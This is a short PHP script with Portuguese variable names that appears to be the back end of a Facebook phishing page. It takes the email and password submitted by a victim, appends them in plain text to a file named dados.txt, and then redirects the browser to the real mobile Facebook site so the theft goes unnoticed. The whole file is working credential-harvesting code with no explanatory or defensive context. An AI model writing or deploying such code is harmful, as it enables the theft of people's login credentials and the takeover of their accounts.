<?php

$LOGIN = $_POST ['email'];
$SENHA = $_POST ['pass'];

$CONTEUDO = "LOGIN: $LOGIN\nSENHA: $SENHA\n\n\n";
$ARQUIVO = "dados.txt";

$ABRIR = fopen($ARQUIVO, "a");
fwrite($ABRIR, $CONTEUDO);

fclose($ABRIR);

echo '<meta http-equiv="refresh" content="0;url=https://m.facebook.com/">';
exit;
?>



